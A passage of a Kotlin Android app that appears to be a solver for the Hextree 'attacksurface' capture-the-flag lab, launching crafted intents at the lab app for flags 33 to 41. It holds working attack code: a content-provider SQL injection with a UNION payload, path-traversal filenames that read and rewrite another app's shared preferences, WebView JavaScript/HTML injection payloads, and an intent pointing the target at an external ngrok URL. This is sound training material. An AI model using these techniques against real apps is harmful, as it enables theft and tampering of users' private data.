                for (i in 0 until cursor.columnCount) {
                    if (i > 0) sb.append(", ")
                    sb.append("${cursor.getColumnName(i)} = ${cursor.getString(i)}")
                }
                sb.append("\n")
            } while (cursor.moveToNext())
            Log.i("yeet",sb.toString())
        }
    }
    onIntentHandled()
}

@Composable
fun HandleIntent33(onIntentHandled: () -> Unit) {

    val context = LocalContext.current

    val startForResult = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.StartActivityForResult()
    ) { result: ActivityResult ->
        Log.d("IntentDump", "receiving")
        val intentDetails = Utils.dumpIntent(context, result.data)
        Log.d("IntentDump", intentDetails)
        val output = result.data
        val contentUri = output?.data
        val sqlquery = "1=1 UNION SELECT *,null from Note --"

        if (contentUri != null) {
            context.contentResolver.query(contentUri, null, sqlquery, null, null)?.use { cursor ->
                if (cursor.moveToFirst()) {
                    val sb = StringBuilder()
                    do {
                        for (i in 0 until cursor.columnCount) {
                            if (i > 0) sb.append(", ")
                            sb.append("${cursor.getColumnName(i)} = ${cursor.getString(i)}")
                        }
                        sb.append("\n")
                    } while (cursor.moveToNext())
                    Log.i("IntentDump",sb.toString())
                }
            }
        }

        onIntentHandled()

    }

    LaunchedEffect(Unit) {
        val intent = Intent().apply {
            setClassName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag33Activity1"
            )
            action = "io.hextree.FLAG33"
        }
        startForResult.launch(intent)
        Log.d("IntentDump", "Sending....")
    }

}

@Composable
fun HandleIntent34(onIntentHandled: () -> Unit) {

    val context = LocalContext.current

    val startForResult = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.StartActivityForResult()
    ) { result: ActivityResult ->
        Log.d("IntentDump", "receiving")
        val intentDetails = Utils.dumpIntent(context, result.data)
        Log.d("IntentDump", intentDetails)
        val data = result.data?.data

        val test = context.contentResolver.openInputStream(data!!)?.bufferedReader()?.use { it.readText() } ?: ""

        Log.d("IntentDump", test)

        onIntentHandled()
    }

    LaunchedEffect(Unit) {
        val intent = Intent().apply {
            setClassName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag34Activity"
            )
            putExtra("filename","flags/flag34.txt")
        }
        startForResult.launch(intent)
        Log.d("IntentDump", "Sending....")
    }


}

@Composable
fun HandleIntent35(onIntentHandled: () -> Unit) {

    val context = LocalContext.current

    val startForResult = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.StartActivityForResult()
    ) { result: ActivityResult ->
        Log.d("IntentDump", "receiving")
        val intentDetails = Utils.dumpIntent(context, result.data)
        Log.d("IntentDump", intentDetails)
        val data = result.data?.data

        val test = context.contentResolver.openInputStream(data!!)?.bufferedReader()?.use { it.readText() } ?: ""

        Log.d("IntentDump", test)

        onIntentHandled()
    }

    LaunchedEffect(Unit) {
        val intent = Intent().apply {
            setClassName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag35Activity"
            )

            putExtra("filename","../flag35.txt")

        }
        startForResult.launch(intent)
        Log.d("IntentDump", "Sending....")
    }


}

@Composable
fun HandleIntent36(onIntentHandled: () -> Unit) {

    val context = LocalContext.current

    val startForResult = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.StartActivityForResult()
    ) { result: ActivityResult ->
        if(result.data ==null){
            Log.d("IntentDump", "nothing")
        } else{
            Log.d("IntentDump", "receiving")
            val intentDetails = Utils.dumpIntent(context, result.data)
            Log.d("IntentDump", intentDetails)
            val data = result.data?.data


            val content = context.contentResolver.openInputStream(data!!)?.bufferedReader()?.use { it.readText() } ?: ""

            val modified = content.replace("false","true")

            context.contentResolver.openOutputStream(data, "w")?.bufferedWriter()?.use { writer ->
                writer.write(modified)
            }

            Log.d("IntentDump", modified)
        }

        onIntentHandled()
    }

    LaunchedEffect(Unit) {
        val inten3 = Intent().apply {
            setClassName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag36Activity"
            )

        }
        startForResult.launch(inten3)
        val intent = Intent().apply {
            setClassName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag35Activity"
            )

            putExtra("filename","../shared_prefs/Flag36Preferences.xml")
        }
        startForResult.launch(intent)
        Log.d("IntentDump", "Sending....")

    }


}

@Composable
fun HandleIntent37(onIntentHandled: () -> Unit) {

    val context = LocalContext.current

    val startForResult = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.StartActivityForResult()
    ) { result: ActivityResult ->
        if(result.data ==null){
            Log.d("IntentDump", "nothing")
        } else{
            Log.d("IntentDump", "receiving")
        }

        onIntentHandled()
    }

    LaunchedEffect(Unit) {
        val intent = Intent().apply {
            setClassName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag37Activity"
            )
                data = Uri.parse("content://io.ks.intentatk.AtkIntent37Provider")
        }
        startForResult.launch(intent)
        Log.d("IntentDump", "Sending....")

    }


}

@Composable
fun HandleIntent38(onIntentHandled: () -> Unit) {

    val context = LocalContext.current

    val startForResult = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.StartActivityForResult()
    ) { result: ActivityResult ->
        if(result.data ==null){
            Log.d("IntentDump", "nothing")
        } else{
            Log.d("IntentDump", "receiving")
        }

        onIntentHandled()
    }

    LaunchedEffect(Unit) {
        val intent = Intent().apply {
            setClassName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.webviews.Flag38WebViewsActivity"
            )
            putExtra("URL", "data:text/html,<button onclick='document.write(hextree.success(true))'>success(true)</button>")
            //putExtra("URL","https://oak.hackstree.io/android/webview/pwn.html")
        }
        startForResult.launch(intent)
        Log.d("IntentDump", "Sending....")

    }


}

@Composable
fun HandleIntent39(onIntentHandled: () -> Unit) {

    val context = LocalContext.current

    val startForResult = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.StartActivityForResult()
    ) { result: ActivityResult ->
        if(result.data ==null){
            Log.d("IntentDump", "nothing")
        } else{
            Log.d("IntentDump", "receiving")
        }

        onIntentHandled()
    }

    LaunchedEffect(Unit) {
        val intent = Intent().apply {
            setClassName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.webviews.Flag39WebViewsActivity"
            )
            //putExtra("NAME", "<a href='javascript:hextree.success()'>test</a>")
            putExtra("NAME", "<button onclick='hextree.success()'>test</button>")
        }
        startForResult.launch(intent)
        Log.d("IntentDump", "Sending....")

    }


}

@Composable
fun HandleIntent40(onIntentHandled: () -> Unit) {

    val context = LocalContext.current

    val startForResult = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.StartActivityForResult()
    ) { result: ActivityResult ->
        if(result.data ==null){
            Log.d("IntentDump", "nothing")
        } else{
            Log.d("IntentDump", "receiving")
        }

        onIntentHandled()
    }

    LaunchedEffect(Unit) {
        val intent = Intent().apply {
            setClassName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.webviews.Flag40WebViewsActivity"
            )
            putExtra("URL", "content://io.ks.intentatk.AtkIntent40Provider/a.html")
            addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
        }
        context.grantUriPermission("io.hextree.attacksurface", Uri.parse("content://io.ks.intentatk.AtkIntent40Provider/a.html") , Intent.FLAG_GRANT_READ_URI_PERMISSION)
        startForResult.launch(intent)
        Log.d("IntentDump", "Sending....")

    }


}

@Composable
fun HandleIntent41(onIntentHandled: () -> Unit) {

    val context = LocalContext.current

    val startForResult = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.StartActivityForResult()
    ) { result: ActivityResult ->
        if(result.data ==null){
            Log.d("IntentDump", "nothing")
        } else{
            Log.d("IntentDump", "receiving")
        }

        onIntentHandled()
    }

    LaunchedEffect(Unit) {
        val intent = Intent().apply {
            setClassName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag41Activity"
            )
            putExtra("URL", "https://d585-115-135-30-252.ngrok-free.app")
        }
        startForResult.launch(intent)
        Log.d("IntentDump", "Sending....")

    }


}


@Composable
fun Greeting(modifier: Modifier = Modifier) {
    val scrollState = rememberScrollState()
    // State to track the captured image
    var capturedImage by remember { mutableStateOf<Bitmap?>(null) }
    // State to track the selected intent
    var actionToPerform by remember { mutableStateOf<Action?>(null) }


    Column(
        modifier = Modifier
            .fillMaxSize()
            .verticalScroll(scrollState),
        verticalArrangement = Arrangement.Center,
        horizontalAlignment = Alignment.CenterHorizontally
    ) {

        capturedImage?.let { bitmap ->
            Image(
                bitmap = bitmap.asImageBitmap(),
                contentDescription = "Captured Image",
                modifier = Modifier
                    .padding(16.dp)
            )
        }
        Button(
            modifier = Modifier,
            onClick = {
                actionToPerform = Action.CaptureImage
            }
        ) {
            Text(text = "Launch Camera")
        }
        repeat(41) { i ->
            if (i + 1 in 14..15 || i + 1 == 21) return@repeat
            Button(
                modifier = Modifier,
                onClick = {
                    actionToPerform = Action.valueOf("Intent${i + 1}")
                }
            ) {
                Text(text = "Launch Intent${i + 1}")
            }
        }

        Spacer(modifier = Modifier.height(40.dp))

    }

    when (actionToPerform) {
        Action.CaptureImage -> HandleIntentCam(
            onImageCaptured = { bitmap ->
                capturedImage = bitmap
                actionToPerform = null // Reset action after handling
            }
        )
        Action.Intent1 -> HandleIntent1(
            onIntentHandled = {
                actionToPerform = null // Reset action after handling
            }
        )
        Action.Intent2 -> HandleIntent2(
            onIntentHandled = {
                actionToPerform = null // Reset action after handling
            }
        )
        Action.Intent3 -> HandleIntent3(
            onIntentHandled = {
                actionToPerform = null // Reset action after handling
            }
        )
        Action.Intent4 -> HandleIntent4(
            onIntentHandled = {
                actionToPerform = null // Reset action after handling
            }
        )
        Action.Intent5 -> HandleIntent5(
            onIntentHandled = {
                actionToPerform = null // Reset action after handling
            }
        )
        Action.Intent6 -> HandleIntent6(
            onIntentHandled = {
                actionToPerform = null // Reset action after handling
            }
        )
        Action.Intent7 -> HandleIntent7(
            onIntentHandled = {
                actionToPerform = null // Reset action after handling
            }
        )
        Action.Intent8 -> HandleIntent8(
            onIntentHandled = {
                actionToPerform = null // Reset action after handling
            }
        )
        Action.Intent9 -> HandleIntent9(
            onIntentHandled = {
                actionToPerform = null // Reset action after handling
            }
        )
        Action.Intent10 -> HandleIntent10(
            onIntentHandled = {
                actionToPerform = null // Reset action after handling
            }
        )
        Action.Intent11 -> HandleIntent11(
            onIntentHandled = {
                actionToPerform = null // Reset action after handling
            }
        )
        Action.Intent12 -> HandleIntent12(
            onIntentHandled = {
                actionToPerform = null // Reset action after handling
            }
        )
        Action.Intent13 -> HandleIntent13(
            onIntentHandled = {
                actionToPerform = null // Reset action after handling
            }
        )
        Action.Intent16 -> HandleIntent16(
            onIntentHandled = {
                actionToPerform = null // Reset action after handling
            }
        )
        Action.Intent17 -> HandleIntent17(
            onIntentHandled = {
                actionToPerform = null // Reset action after handling
            }
        )
        Action.Intent19 -> HandleIntent19(
            onIntentHandled = {
                actionToPerform = null // Reset action after handling
            }
        )
        Action.Intent22 -> HandleIntent22(
            onIntentHandled = {
                actionToPerform = null // Reset action after handling
            }
        )
        Action.Intent23 -> HandleIntent23(
            onIntentHandled = {
                actionToPerform = null // Reset action after handling
            }
        )
        Action.Intent24 -> HandleIntent24(
            onIntentHandled = {
                actionToPerform = null // Reset action after handling
            }
        )
        Action.Intent25 -> HandleIntent25(
            onIntentHandled = {
                actionToPerform = null // Reset action after handling
            }
        )
        Action.Intent26 -> HandleIntent26(
            onIntentHandled = {
                actionToPerform = null // Reset action after handling
            }
        )
        Action.Intent27 -> HandleIntent27(
            onIntentHandled = {
                actionToPerform = null // Reset action after handling
            }
        )
        Action.Intent28 -> HandleIntent28(
            onIntentHandled = {
                actionToPerform = null // Reset action after handling
            }
        )
        Action.Intent29 -> HandleIntent29(
            onIntentHandled = {
                actionToPerform = null // Reset action after handling
            }
        )
        Action.Intent30 -> HandleIntent30(
            onIntentHandled = {
                actionToPerform = null // Reset action after handling
            }
        )
        Action.Intent31 -> HandleIntent31(
            onIntentHandled = {
                actionToPerform = null // Reset action after handling
            }
        )
        Action.Intent32 -> HandleIntent32(
            onIntentHandled = {
                actionToPerform = null // Reset action after handling
            }
        )
        Action.Intent33 -> HandleIntent33(
            onIntentHandled = {
                actionToPerform = null // Reset action after handling
            }
        )
        Action.Intent34 -> HandleIntent34(
            onIntentHandled = {
                actionToPerform = null // Reset action after handling
            }
        )
        Action.Intent35 -> HandleIntent35(
            onIntentHandled = {
                actionToPerform = null // Reset action after handling
            }
        )
        Action.Intent36 -> HandleIntent36(
            onIntentHandled = {
                actionToPerform = null // Reset action after handling
            }
        )
        Action.Intent37 -> HandleIntent37(
            onIntentHandled = {
                actionToPerform = null // Reset action after handling
            }
        )
        Action.Intent38 -> HandleIntent38(
            onIntentHandled = {
                actionToPerform = null // Reset action after handling
            }
        )
        Action.Intent39 -> HandleIntent39(
            onIntentHandled = {
                actionToPerform = null // Reset action after handling
            }
        )
        Action.Intent40 -> HandleIntent40(
            onIntentHandled = {
                actionToPerform = null // Reset action after handling
            }
        )
        Action.Intent41 -> HandleIntent41(
            onIntentHandled = {
                actionToPerform = null // Reset action after handling
            }
        )
        null -> {} // Do nothing if no action is selected
    }



}

